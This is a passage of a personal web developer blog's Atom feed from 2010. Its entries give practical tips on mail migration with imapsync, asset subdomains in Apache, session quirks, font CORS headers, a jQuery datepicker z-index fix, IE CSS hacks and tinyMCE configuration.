Dreamhost server. Once at least one address is created, Dreamhost
automatically creates the matching A and MX records.&lt;/p&gt;

&lt;p&gt;I had to update my zone file on my registrar to update the previously MX and A
records that were set to point to Google and updated to point to Dreamhost. I
have to use an intermediate zone file on my registrar because I&amp;#39;m dealing with
&lt;a href=&quot;/blog/24:configuring-a-fr-with-dreamhost&quot;&gt;a limitation of the .fr TLD&lt;/a&gt; here.&lt;/p&gt;

&lt;p&gt;Once the zone were updated and changes repercuted accross the network, I
connected to the new Squirel mail. My inbox was empty.&lt;/p&gt;

&lt;p&gt;So I ran &lt;code&gt;imapsync&lt;/code&gt; to copy all mails from the google hosted service to my new
server.&lt;/p&gt;

&lt;p&gt;The syntax to be used is a little different than the one I mentioned on my
previous post, so here it is :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;imapsync --host1 imap.gmail.com --ssl1 --authmech1 LOGIN --user1 foo@domain.fr --passfile1 /path/to/pass1 --host2 208.97.*.* --user2 foo@domain.fr --passfile2 /path/to/pass2 --useheader&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;X-GMail-Received&amp;quot;&lt;/span&gt; --useheader &lt;span class=&quot;s1&quot;&gt;&amp;#39;Message-Id&amp;#39;&lt;/span&gt; --noauthmd5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;After that, I reloaded my Squirel Mail inbox, and it was populated. I just had
to do that for every account.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Performance improvement : moving assets to subdomains</title>
   <link href="http://blog.pixelastic.com/2010/11/08/performance-improvement-moving-assets-subdomains/"/>
   <updated>2010-11-08T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/11/08/performance-improvement-moving-assets-subdomains</id>
   <content type="html">&lt;p&gt;&lt;strong&gt;Disclaimer : What I&amp;#39;m talking about in this blog post can be optimised. Yes,
having multiple hosts is a great feature for performance improvement, but
I kind of did it wrong. My recent try at the webperf contest gave me more
insight on how to do it right.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;I&amp;#39;ll post more on the subject or update this post to reflect that.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve just added to this site a performance improvement I read a long time ago
but never implemented.&lt;/p&gt;

&lt;p&gt;I&amp;#39;m talking about the multiple domains to serve static content. There are two
important things to note here : parallel requests and cookies. Let me explain
in a little more details what it&amp;#39;s all about.&lt;/p&gt;

&lt;h2&gt;Parallell requests&lt;/h2&gt;

&lt;p&gt;Your browser is only able to perform a certain number of parallel request at
the same time. It means that it can only download a certain number of files
concurrently (usually 4).&lt;/p&gt;

&lt;p&gt;In other words, it will start the download of, say, a CSS file, a Javascript
file, and two images. Then, whenever one of this files is received, it will
start downloading a new file, and so on.&lt;/p&gt;

&lt;p&gt;This means that there is a certain amount of time that is &amp;quot;lost&amp;quot; in the
process. You have to wait for one of the files to be downloaded before
starting downloading the next.&lt;/p&gt;

&lt;p&gt;The important thing to note is that the limit on the number of parallel
downloads is set on a per-domain basis. It means that you can download only 4
files of &lt;code&gt;foo.com&lt;/code&gt; while downloading at the same time 4 files from &lt;code&gt;bar.com&lt;/code&gt;.
This is the basic of what we will be using to our advantage.&lt;/p&gt;

&lt;p&gt;Splitting your files accross several domains (or subdomains) allows you to get
the best of parallel download. You do not really need to have your content
hosted on different servers, you just need them to be accessible through
different domain names, and subdomains are just perfect for that.&lt;/p&gt;

&lt;p&gt;I have created four subdomains : &lt;code&gt;css.pixelastic.com&lt;/code&gt;, &lt;code&gt;js.pixelastic.com&lt;/code&gt;,
&lt;code&gt;img.pixelastic.co&lt;/code&gt;m and &lt;code&gt;dl.pixelastic.com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Each one maps to the exact same site as &lt;code&gt;www.pixelastic.com&lt;/code&gt; but using
different names improve the number of possible downloads and thus improve page
load.&lt;/p&gt;

&lt;h2&gt;Cookies&lt;/h2&gt;

&lt;p&gt;All this stuff about subdomains brings me to my second point : cookies.&lt;/p&gt;

&lt;p&gt;If you host all your files on the same domain, it means that all requests (be
it a php page or a static css file) will send cookie information without you
knowing.&lt;/p&gt;

&lt;p&gt;Cookie data is usually small, like 100Ko or so, but is added to every single
request made. And most of the time this information is not even useful.&lt;/p&gt;

&lt;p&gt;Apart from the fact that you are slowly killing your website bandwith with
useless information, your are also decreasing your page speed load for your
potential user.&lt;/p&gt;

&lt;p&gt;The same trick of using a subdomain applies here too, and cookies won&amp;#39;t be
sent.&lt;/p&gt;

&lt;p&gt;There is one caveat that you should be aware of, though. If your site is
accessible through &lt;code&gt;domain.com&lt;/code&gt; and you host your files on &lt;code&gt;files.domain.com&lt;/code&gt;,
cookies will still be sent because &lt;code&gt;domain.com&lt;/code&gt; is considered the master
domain of &lt;code&gt;files.domain.com&lt;/code&gt; and thus all cookies set on the main domain will
also propagate to the subdomains.&lt;/p&gt;

&lt;p&gt;On the other hand, if your main domain is &lt;code&gt;www.domain.com&lt;/code&gt;, it is not
considered a parent domain of &lt;code&gt;files.domain.com&lt;/code&gt; (but rather a sibling
domain).&lt;/p&gt;

&lt;h2&gt;Configuring Apache&lt;/h2&gt;

&lt;p&gt;If you need to edit your &lt;code&gt;httpd.con&lt;/code&gt;f file, here is what I put to add my
different subdomains on my local machine :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;VirtualHost&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;*:80&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;ServerName&lt;/span&gt; pixelastic
  &lt;span class=&quot;nb&quot;&gt;ServerAlias&lt;/span&gt; www.pixelastic
  &lt;span class=&quot;nb&quot;&gt;ServerAlias&lt;/span&gt; css.pixelastic
  &lt;span class=&quot;nb&quot;&gt;ServerAlias&lt;/span&gt; js.pixelastic
  &lt;span class=&quot;nb&quot;&gt;ServerAlias&lt;/span&gt; img.pixelastic
  &lt;span class=&quot;nb&quot;&gt;ServerAlias&lt;/span&gt; dl.pixelastic
  &lt;span class=&quot;nb&quot;&gt;DocumentRoot&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www/pixelastic.com&amp;quot;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;Directory&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;www/pixelastic.com&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;Options&lt;/span&gt; Indexes FollowSymLinks Includes ExecCGI
    &lt;span class=&quot;nb&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;All&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;Order&lt;/span&gt; allow,deny
    &lt;span class=&quot;nb&quot;&gt;Allow&lt;/span&gt; from &lt;span class=&quot;k&quot;&gt;all&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/VirtualHost&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>The multi-tab admin problem</title>
   <link href="http://blog.pixelastic.com/2010/11/08/multi-tab-admin-problem/"/>
   <updated>2010-11-08T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/11/08/multi-tab-admin-problem</id>
   <content type="html">&lt;p&gt;Today I had to update an important zone file at my registrar. Because it was
quite important, and because I already did an almost identical job a few
months ago, I decided to copy-paste the old work.&lt;/p&gt;

&lt;p&gt;So I started by opening the &lt;code&gt;domain A&lt;/code&gt; zone edit page. ThenÂ  I opened a new
tab, and loaded the &lt;code&gt;domain B&lt;/code&gt; zone edit page.&lt;/p&gt;

&lt;p&gt;I selected the &lt;code&gt;domain B&lt;/code&gt; content and copied it in the &lt;code&gt;domain A&lt;/code&gt; page. I had
to update some values, mostly IP addresses, and then validate the page.&lt;/p&gt;

&lt;p&gt;Instead of updating the &lt;code&gt;domain A&lt;/code&gt; zones as I expected, it updated the &lt;code&gt;domain
B&lt;/code&gt; zones and left the &lt;code&gt;domain A&lt;/code&gt; unchanged. Can you guess why ?&lt;/p&gt;

&lt;h2&gt;Session handling&lt;/h2&gt;

&lt;p&gt;My guess is that everytime I opened a new page, a Session was tracking my
&amp;quot;current&amp;quot; domain, the one I was editing. So opening a new tab to a new domain
changed my current domain from &lt;code&gt;domain A&lt;/code&gt; to &lt;code&gt;domain B&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Therefore, when I updated the &lt;code&gt;domain A&lt;/code&gt; zone, the next page was assuming I
was editing the &lt;code&gt;domain B&lt;/code&gt; page. If I had opened the tabs in reverse order, it
would have worked seamlessly.&lt;/p&gt;

&lt;h2&gt;Why doing that ?&lt;/h2&gt;

&lt;p&gt;I have encountered a similar behavior in my own apps. By using the cakePHP
Security behavior, a special security token is generated for each form. Its
integrity is checked whenever a form is posted, and verify that no field has
been tampered (no mandatory field has been deleted, no new field has been
added).&lt;/p&gt;

&lt;p&gt;This is a great security component, but because a special key is stored on the
Session side, it also means that whenever you open several tabs, only the
latest can be correctly checked and all other one will get rejected.&lt;/p&gt;

&lt;p&gt;It bugs me at first, because I used to open several tabs whenever I need to
&amp;quot;batch add&amp;quot; a lot of items. In real life, I found that I was almost the only
person to do that... So I finally accepted the multi-tab restriction.&lt;/p&gt;

&lt;p&gt;Getting back to my registrar : I guess they did it that way because of
security reasons too, but I found it particularly counter-intuitive in that
case and that could have led to serious damages.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Using fonts hosted on a subdomain with @font-face and Firefox</title>
   <link href="http://blog.pixelastic.com/2010/11/08/fonts-hosted-subdomain-font-face-firefox/"/>
   <updated>2010-11-08T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/11/08/fonts-hosted-subdomain-font-face-firefox</id>
   <content type="html">&lt;p&gt;As a security reason, Firefox do not allow an &lt;code&gt;@font-face&lt;/code&gt; rule to load fonts
hosted on a different domain (even a subdomain).&lt;/p&gt;

&lt;p&gt;I don&amp;#39;t exactly understand why, I guess it has something to do with preventing
crosslinking and copyright violation. I think we should keep the website
author handle all this stuff and not required the browser to make assumptions
like that.&lt;/p&gt;

&lt;p&gt;Anyway, I recently tried to move my CSS file to a subdomain, to reduce pages
loading times. Doing so I saw that my fonts did not correctly load on Firefox.&lt;/p&gt;

&lt;p&gt;After some digging, I found that I had to manually allow them to be linked
from an other domain, server-side. Here is the little snippet I added to my
&lt;code&gt;.htaccess&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;FilesMatch&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;\.(ttf|otf|woff)$&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;IfModule&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;mod_headers.c&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;Header&lt;/span&gt; set Access-Control-Allow-Origin &lt;span class=&quot;s2&quot;&gt;&amp;quot;*&amp;quot;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/IfModule&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Setting the z-index of a jQuery UI datepicker</title>
   <link href="http://blog.pixelastic.com/2010/10/20/setting-zindex-jquery-ui-datepicker/"/>
   <updated>2010-10-20T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/10/20/setting-zindex-jquery-ui-datepicker</id>
   <content type="html">&lt;p&gt;I ran into a collision issue with two of my absolutly positionned elements on
a form page. I had an invisible flash buttun (used to launch an upload
process) as well as jQuery UI datepicker.&lt;/p&gt;

&lt;p&gt;The form was built in a way that when the datepicker was displayed, it was
supposed to be on top of the invisible Flash button. Unfortunatly the button
was in fact &amp;quot;on top&amp;quot; of the datepicker, but being invisible you do not notice
it until you click.&lt;/p&gt;

&lt;p&gt;This resulted in an upload dialog popping up and many confused users.&lt;/p&gt;

&lt;h2&gt;The fix&lt;/h2&gt;

&lt;p&gt;The Flash &lt;code&gt;z-index&lt;/code&gt; is fixed in my CSS (10), so I thought that adding a
greater &lt;code&gt;z-index&lt;/code&gt; to the jQuery UI datepicker in CSS would be enough.&lt;/p&gt;

&lt;p&gt;It is not. The jQuery UI datepicker seems to automatically set the &lt;code&gt;z-index&lt;/code&gt;
to 1, whatever you specified.&lt;/p&gt;

&lt;p&gt;I checked the &lt;a href=&quot;http://jqueryui.com/demos/datepicker/&quot;&gt;datepicker options&lt;/a&gt;,
looking for a &lt;code&gt;zIndex&lt;/code&gt; key, but found nothing...&lt;/p&gt;

&lt;p&gt;I tried the &lt;code&gt;beforeShow&lt;/code&gt;event, to manually set the &lt;code&gt;z-index&lt;/code&gt;, but it seems
that jQuery still update my value to 1 AFTER the event.&lt;/p&gt;

&lt;p&gt;So I finally resorted to adding a small timeout to re-add my value after
jQuery. This is a bit of a hack but given the context this is the only way I
found.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// Set the datepicker zIndex on load&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;datepicker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;&amp;#39;beforeShow&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;datepicker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;datepicker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dpDiv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;css&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;zIndex&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Finding a string in multiple files</title>
   <link href="http://blog.pixelastic.com/2010/10/19/finding-string-multiple-files/"/>
   <updated>2010-10-19T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/10/19/finding-string-multiple-files</id>
   <content type="html">&lt;p&gt;Lately I was receiving emails with just the text &amp;quot;Blablabla&amp;quot; from an old
(online) production server. This was obviously from an old debug script that I
should have put online and forgot.&lt;/p&gt;

&lt;p&gt;Unfortunatly, I wasn&amp;#39;t able to track down exactly from where it originated. I
had no mention of that string in my local files.&lt;/p&gt;

&lt;p&gt;So I connected to the serveur using ssh and ran the following command : grep
-R Blablabla /path&lt;/p&gt;

&lt;p&gt;After some processing, I got the incriminating file and was able to delete it.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Some CSS hacks to target IE6 and IE7</title>
   <link href="http://blog.pixelastic.com/2010/10/16/css-hacks-target-ie6-ie7/"/>
   <updated>2010-10-16T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/10/16/css-hacks-target-ie6-ie7</id>
   <content type="html">&lt;p&gt;After stopping using ugly IE hacks and moving to conditionnal comments to load
a special IE stylesheet, I now use conditional comments to mark my body
element with classes reflecting the current IE version.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!--[if IE 6]&amp;gt;&amp;lt;body class=&amp;quot;ie ie6 ie-lt8 ie-lt9&amp;quot;&amp;gt;&amp;lt;![endif]--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--[if IE 7]&amp;gt;&amp;lt;body class=&amp;quot;ie ie7 ie-lt8 ie-lt9&amp;quot;&amp;gt;&amp;lt;![endif]--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--[if IE 8]&amp;gt;&amp;lt;body class=&amp;quot;ie ie8 ie-lt9&amp;quot;&amp;gt;&amp;lt;![endif]--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--[if IE 9]&amp;gt;&amp;lt;body class=&amp;quot;ie ie9&amp;quot;&amp;gt;&amp;lt;![endif]--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--[if !IE]&amp;gt;&amp;lt;!--&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;nie&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!--&amp;lt;![endif]--&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This saves me a lot of trouble : less files to manage and easier fixes to
write. I quite happy with this solution and have tested it accross several
projects for the past 3 months. It works really well.&lt;/p&gt;

&lt;p&gt;I had to work on a legacy project last week, where this technique wasn&amp;#39;t
implemented but all the css code was still compressed using CSSTidy. And I ran
into a couple of issues.&lt;/p&gt;

&lt;h2&gt;CSSTidy messes the star and underscore hacks&lt;/h2&gt;

&lt;p&gt;Using the brilliant &lt;code&gt;_property&lt;/code&gt; and &lt;code&gt;*property&lt;/code&gt; hacks to target IE6 and IE7
does not work in conjunction with CSSTidy.&lt;/p&gt;

&lt;p&gt;For the &lt;code&gt;_property hack&lt;/code&gt;, the property is kept as-is, with the underscore, but
as they are alphabetically arranged, the &lt;code&gt;_background&lt;/code&gt; gets added before the
&lt;code&gt;background&lt;/code&gt;, rendering it absolutly useless.&lt;/p&gt;

&lt;p&gt;On the other hand, on the &lt;code&gt;*property&lt;/code&gt;, the &lt;code&gt;*&lt;/code&gt; gets removed, and the value is
merged with the original value of the correct property. Useless too.&lt;/p&gt;

&lt;h2&gt;Other solutions that worked&lt;/h2&gt;

&lt;p&gt;To avoid digging into CSSTidy one more time, I tried to find other ways to
achieve the same effect.&lt;/p&gt;

&lt;p&gt;To target IE6 I used the &lt;code&gt;!ie6&lt;/code&gt; hack by writing &lt;code&gt;.mySelector { property:value
!ie6; }&lt;/code&gt;. IE6 is dumb enough to understand any &lt;code&gt;!blahblah&lt;/code&gt; as &lt;code&gt;!important&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I could have also used the fact that IE6 understands &lt;code&gt;.class1.class2&lt;/code&gt; as
&lt;code&gt;.class2&lt;/code&gt;, and could have written &lt;code&gt;.ie6.mySelector { property:value; }&lt;/code&gt; (of
course, you have absolutly no &lt;code&gt;class=&amp;quot;ie6&amp;quot;&lt;/code&gt; in your code)&lt;/p&gt;

&lt;p&gt;To target IE7 I made a custom selector that its parsing engine is the only one
to understand : &lt;code&gt;*:first-child + html .mySelector { property:value; }&lt;/code&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Preventing tinyMCE from wrapping <img /> in <p></title>
   <link href="http://blog.pixelastic.com/2010/10/11/preventing-tinymce-wrapping-img/"/>
   <updated>2010-10-11T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/10/11/preventing-tinymce-wrapping-img</id>
   <content type="html">&lt;p&gt;If you just want to add a presentational image in a tinyMCE editor, you&amp;#39;ll
find out very quickly that it will be wrapped in &lt;code&gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&lt;/code&gt; without you asking.&lt;/p&gt;

&lt;p&gt;The question has been asked several times on the tinyMCE forums, but the
answers never quite satisfied me. It ranges from the classical &amp;quot;&lt;em&gt;Why do you
want to do this ? You should better use &lt;code&gt;&amp;lt;insert semantic element and css
here&amp;gt;&lt;/code&gt;&lt;/em&gt;&amp;quot; to &amp;quot;&lt;em&gt;Just do a regexp before displaying your content to remove the bad
&lt;code&gt;&amp;lt;p&amp;gt;...&amp;lt;/p&amp;gt;&lt;/code&gt;&lt;/em&gt;&amp;quot;.&lt;/p&gt;

&lt;p&gt;This clearly did not satisfy me.&lt;/p&gt;

&lt;p&gt;The solution was to define the&lt;code&gt;forced_root_block&lt;/code&gt; setting value to &lt;code&gt;false&lt;/code&gt;,
allowing us to create any element on the top level, and not having it
automatically wrapped in &lt;code&gt;&amp;lt;p&amp;gt;.&lt;/code&gt;&lt;/p&gt;

&lt;h2&gt;Fixing the side effect&lt;/h2&gt;

&lt;p&gt;Allowing for elements to be input directly in the root level has the nasty
side effect of creating tinyMCE editor instances with a default text of, well,
nothing, instead of the really usefull &lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt; tag. Also, if you do a Ctrl+A and
delete all content, you&amp;#39;ll end up with an empty editor without the initial
&lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt; tags&lt;/p&gt;

&lt;p&gt;To fix this part, I just added an &lt;code&gt;onNodeChange&lt;/code&gt;event to fire every time the
content is changed. I test the current content and if empty add the &lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt; tag.
There is a little subtelty though, to correctly place the caret where needed.&lt;/p&gt;

&lt;p&gt;In your &lt;code&gt;tinyMCE.init&lt;/code&gt; call, just add the following setup key :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;tinyMCE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onNodeChange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;editorContent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editorContent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// We set content as a &amp;lt;p&amp;gt; containing a placeholder, then we delete the placeholder to place the caret&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;lt;span id=&amp;quot;__CaretPlacholder&amp;quot;&amp;gt;Placeholder&amp;lt;/span&amp;gt;&amp;lt;/p&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;selection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;#__CaretPlacholder&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
